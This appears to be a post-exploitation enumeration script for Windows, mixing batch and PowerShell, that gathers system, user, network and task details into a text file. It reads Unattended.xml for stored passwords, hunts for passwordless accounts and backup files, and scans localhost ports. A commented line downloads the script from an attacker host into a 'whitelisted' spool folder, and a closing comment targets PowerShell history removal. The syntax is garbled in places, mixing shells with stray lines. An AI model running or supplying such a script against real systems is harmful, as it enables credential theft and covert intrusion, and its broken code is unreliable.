```
@echo off
#windo
#(New-Object System.Net.WebClient).Downloadfile('http://<LHOST>:<LPORT>/win3num.bat') #download file
#C:\Windows\System32\spool\drivers\color #save files here, whitelisted

echo "${B}\n------------------------------Start------------------------------\n\n${G}" >> win1.txt
date/time?
echo "${B}\n------------------------------PC info------------------------------\n\n${G}" >> win1.txt
hostname >> win1.txt
whoami >> win1.txt
systeminfo >> win1.txt
echo "${B}\n------------------------------Users------------------------------\n\n${R}" >> win1.txt
net user %USERNAME%
Get-LocalUser >> win1.txt
net users >> win1.txt
echo "${B}\n------------------------------Dir files------------------------------\n\n${G}" >> win1.txt
Get-ChildItem >> win1.txt
dir | Format-List * >> win1.txt
echo "${B}\n------------------------------IP info------------------------------\n\n${G}" >> win1.txt
Get-NetIPAddress >> win1.txt
ipconfig /all >> win1.txt
echo "${B}\n------------------------------No password------------------------------\n\n${R}" >> win1.txt
Get-LocalUser | Where-Object -Property PasswordRequired -Match false >> win1.txt
echo "${B}\n------------------------------Passwords------------------------------\n\n${R}" >> win1.txt
Get-Content "C:\Windows\Panther\Unattend\Unattended.xml" >> win1.txt
echo "${B}\n------------------------------C:\ Owner------------------------------\n\n${R}" >> win1.txt
Get-Acl C:\ >> win1.txt
echo "${B}\n------------------------------SPN------------------------------\n\n${G}" >> win1.txt
setspn -T medin -Q ? */* >> win1.txt
echo "${B}\n------------------------------Cmdlets------------------------------\n\n${R}" >> win1.txt
Get-Command -CommandType Cmdlet | measure >> win1.txt
echo "${B}\n------------------------------Execution policy------------------------------\n\n${R}" >> win1.txt
Get-ExecutionPolicy -list >> win1.txt
echo "${B}\n------------------------------Scheduled taks------------------------------\n\n${R}" >> win1.txt
schtasks /query /fo LIST /v >> win1.txt
echo "${B}\n------------------------------Backup files------------------------------\n\n${R}" >> win1.txt
Get-ChildItem -Path C: -Include .bak -File -Recurse -ErrorAction SilentlyContinue >> win1.txt
echo "${B}\n------------------------------Port scan------------------------------\n\n${G}" >> win1.txt
#port scan
for($i=1; $i -le 10000; $i++){
    
Test-NetConnection localhost -Port $i

}
#show hidden files
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
#remove bash history files
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
